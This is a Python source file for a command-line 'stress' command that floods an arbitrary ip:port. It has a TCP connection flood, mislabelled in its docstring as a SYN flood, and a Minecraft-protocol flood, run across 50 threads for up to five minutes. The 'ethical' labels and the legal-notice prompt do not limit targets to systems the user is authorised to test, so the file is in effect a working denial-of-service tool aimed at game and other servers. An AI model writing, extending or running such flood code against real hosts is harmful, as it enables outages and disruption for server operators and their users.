# commands/stressCommand.py
import socket
import threading
import time
from modules.colorsModule import COLOR

class StressTester:
    def __init__(self):
        self.running = False
        self.max_workers = 50  # Ethical limit
        self.default_duration = 30  # seconds
        self.timeout = 5  # connection timeout

    def layer4_flood(self, ip: str, port: int, duration: int):
        """TCP SYN Flood (Layer 4)"""
        payload = b'\x00' * 64  # Small payload
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((ip, port))
                s.send(payload)
            except:
                pass
            finally:
                try: s.close()
                except: pass

    def layer7_minecraft(self, ip: str, port: int, duration: int):
        """Minecraft Protocol Flood (Layer 7)"""
        handshake = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # Minimal handshake
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((ip, port))
                s.send(handshake)
                time.sleep(0.1)  # Be gentler on Layer 7
            except:
                pass
            finally:
                try: s.close()
                except: pass

def handle_stress(args):
    """Ethical stress testing command"""
    tester = StressTester()
    
    try:
        ip, port = args[0].split(':')
        port = int(port)
    except:
        print(f"{COLOR.RED}Invalid format. Use <ip:port>{COLOR.RESET}")
        return

    # Parameters
    layer = 4 if "--layer 4" in args else (7 if "--layer 7" in args else 4)
    duration = int(args[args.index("--duration")+1]) if "--duration" in args else tester.default_duration
    duration = min(duration, 300)  # Max 5 minutes

    # Confirmation
    print(f"\n{COLOR.NEON_RED}⚠️ LEGAL NOTICE ⚠️{COLOR.RESET}")
    print(f"You are about to test: {COLOR.WHITE}{ip}:{port}{COLOR.RESET}")
    print(f"Mode: Layer {layer} | Duration: {duration}s | Max workers: {tester.max_workers}")
    
    confirm = input(f"{COLOR.YELLOW}Type 'CONFIRM' to proceed: {COLOR.RESET}")
    if confirm != "CONFIRM":
        return

    # Run test
    tester.running = True
    threads = []

    print(f"\n{COLOR.BLUE}Starting ethical stress test (CTRL+C to stop)...{COLOR.RESET}")
    
    for _ in range(tester.max_workers):
        t = threading.Thread(
            target=tester.layer4_flood if layer == 4 else tester.layer7_minecraft,
            args=(ip, port, duration)
        )
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        tester.running = False
        print(f"{COLOR.YELLOW}\nTest stopped by user{COLOR.RESET}")
    
    print(f"{COLOR.GREEN}Test completed.{COLOR.RESET}")